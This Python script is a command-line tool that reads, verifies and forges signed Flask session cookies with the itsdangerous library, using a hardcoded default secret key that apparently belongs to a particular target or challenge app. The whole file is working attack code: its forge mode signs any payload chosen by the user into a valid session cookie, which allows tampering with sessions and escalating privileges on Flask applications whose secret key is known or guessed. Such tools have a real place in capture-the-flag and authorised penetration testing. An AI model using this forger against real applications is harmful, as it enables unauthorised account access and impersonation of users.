import argparse
from itsdangerous import URLSafeTimedSerializer, BadTimeSignature,BadSignature, URLSafeSerializer, BadPayload
from flask.sessions import session_json_serializer
from termcolor import colored
import base64
import zlib

class FlaskCookieForger:
    def __init__(self, mode: int, payload: str or None, signer_type: str, secret_key: str, salt: str,
                 serializer_type: str, key_derivation: str, digest_method: str, do_compress: bool):
        self.__payload = payload
        self.__signer  = None
        self.__signer_type = signer_type
        self.__do_compress = do_compress
        if signer_type == "URLSafeTimedSerializer":
            serializer = None
            if serializer_type == "session_json_serializer":
                serializer = session_json_serializer
            self.__signer = URLSafeTimedSerializer(secret_key=secret_key, salt=salt, serializer=serializer,
                                                   signer_kwargs={'key_derivation': key_derivation,
                                                                  'digest_method': digest_method})
        elif signer_type == "URLSafeSerializer":
            serializer = None
            if serializer_type == "session_json_serializer":
                serializer = session_json_serializer
            self.__signer = URLSafeSerializer(secret_key=secret_key, salt=salt, serializer=serializer,
                                                   signer_kwargs={'key_derivation': key_derivation,
                                                                  'digest_method': digest_method})
        if mode == 0:
            self.forge()
        if mode == 1:
            self.verify()
        if mode == 2:
            self.read()

    def forge(self) -> str or None:
        print(colored('[+]', 'green') + ' Mode = forging cookie')
        if self.__payload is None:
            print(colored('[-]', 'red') + ' For forge cookie you must specify payload')
            exit(-1)
        if self.__do_compress:
            forged_session = self.__signer.dumps(zlib.compress(self.__payload.encode('utf-8')))
            forged_session = '.' + forged_session
        else:
            forged_session = self.__signer.dumps(self.__payload)
        print(colored('[+]', 'green') + ' session successful forged')
        print('You cookie = ' + colored(forged_session, 'yellow'))
        return forged_session


    def verify(self) -> bool:
        print(colored('[+]', 'green') + ' Mode = reading and verify cookie')
        if self.__payload is None:
            print(colored('[-]', 'red') + ' For reading cookie you must specify payload')
            exit(-1)
        if self.__payload[0] == ".":
            is_compressed = True
            data = self.__payload[1:]
        else:
            is_compressed = False
            data = self.__payload
        data = data.split('.')
        if len(data) != 3 and len(data) != 2:
            print(colored('[-]', 'red') + " It doesn't look like flask cookie, example of flask cookie - " +
                  colored('eyJyb2xlIjoiaW5mbyJ9.XJ3M3w.lE5vK4fi4o3oZtOO3RKrvFIYh2w', 'yellow'))
            exit(-1)
        try:
            print('cookie = ' + colored(self.__payload, 'yellow'))
            timestamp = str(None)
            if self.__signer_type == "URLSafeSerializer":
                session_data= self.__signer.loads(self.__payload)
            else:
                session_data, timestamp = self.__signer.loads(self.__payload[1:], return_timestamp=True)
            if is_compressed:
                session_data = zlib.decompress(session_data)
            print('Cookie = ' + colored(session_data, 'yellow') + '\tTimestamp = ' + colored(timestamp, 'yellow'))
            print(colored('[+]', 'green') + ' Signature is fine')
            return True
        except BadTimeSignature as e:
            print(colored('[-]', 'red') + "Incorrect signature")
            print(e.args)
            print('Check secret key and salt, also have a look on key derivation and digest methods. Also,'
                  ' if you use signer without timestamp check if serializer work without timestamp')
        except BadSignature as e:
            print(colored('[-]', 'red') + "Incorrect signature")
            print(e.args)
            print('Check secret key and salt, also have a look on key derivation and digest methods. Also,'
                  ' if you use signer without timestamp check if serializer work without timestamp')
        except BadPayload as e:
            print(colored('[-]', 'red') + "Incorrect signature")
            print(e.args)
            print('Check secret key and salt, also have a look on key derivation and digest methods. Also,'
                  ' if you use signer without timestamp check if serializer work without timestamp')
        return False

    def read(self) -> str:
        print(colored('[+]', 'green') + ' Mode = reading cookie')
        if self.__payload is None:
            print(colored('[-]', 'red') + ' For reading cookie you must specify payload')
            exit(-1)
        if self.__payload[0] == ".":
            is_compressed = True
            data = self.__payload[1:]
        else:
            is_compressed = False
            data = self.__payload
        data = data.split('.')
        if len(data) != 3 and len(data) != 2:
            print(colored('[-]', 'red') + " It doesn't look like flask cookie, example of flask cookie - " +
                  colored('eyJyb2xlIjoiaW5mbyJ9.XJ3M3w.lE5vK4fi4o3oZtOO3RKrvFIYh2w', 'yellow'))
            exit(-1)
        session_payload = data[0]
        decoded_sess_payload = base64.urlsafe_b64decode(session_payload)
        if is_compressed:
            decoded_sess_payload = zlib.decompress(decoded_sess_payload)
        print(colored('[+]', 'green') + ' Result = ' + decoded_sess_payload.decode('utf-8'))
        return session_payload


if __name__ == "__main__":
    parser = argparse.ArgumentParser()
    parser.add_argument('mode', help="Application mode. May be set in read, verify or forge")
    parser.add_argument('payload', help="Depends on mode. If mode set to read or verify it's cookie that you need read"
                                        " or verify. Otherwise it's payload for cookie.")
    parser.add_argument('--signer_type', default='URLSafeTimedSerializer',
                        help="Signer type you want to use. Default value is URLSafeTimedSerializer. Supported signers:"
                             " URLSafeTimedSerializer, URLSafeSerializer, .")
    parser.add_argument('--secret_key', default="UGhldmJoZj8gYWl2ZnZoei5wYnovcG5lcnJlZg==",
                        help="Secret key that the app uses to sign cookie. Default value is"
                             " UGhldmJoZj8gYWl2ZnZoei5wYnovcG5lcnJlZg==.")
    parser.add_argument('--salt', default='cookie-session',
                        help="Salt used by the app to sign a cookie. Default value is 'cookie-session'.")
    parser.add_argument('--serializer_type', default='session_json_serializer',
                        help='Type of serializer you want to use. Default value is session_json_serializer.')
    parser.add_argument('--key_derivation', default='hmac', help='Key Derivation method. Default value is hmac.')
    parser.add_argument('--digest_method', default='sha1', help='Digest Method. Default value is sha1.')
    parser.add_argument('--do_compress', help='The parameter is responsible for whether or not to use compression when'
                                              ' forge cookies in forger mode. By default set to False',
                        action="store_true")
    args = parser.parse_args()
    mode = None
    payload = None
    if args.mode == 'read' or args.mode == 'READ':
        mode = 2
    elif args.mode == 'verify' or args.mode == 'VERIFY':
        mode = 1
    elif args.mode == 'forge' or args.mode == 'FORGE':
        mode = 0
    else:
        print('Supported modes: read, verify and forge')
    payload = args.payload
    signer_type = args.signer_type
    secret_key = args.secret_key
    salt = args.salt
    serializer_type = args.serializer_type
    key_derivation = args.key_derivation
    digest_method = args.digest_method
    do_compress = args.do_compress
    FlaskCookieForger(mode=mode, payload=payload, signer_type=signer_type, secret_key=secret_key, salt=salt,
                      serializer_type=serializer_type, key_derivation=key_derivation, digest_method=digest_method,
                      do_compress=do_compress)
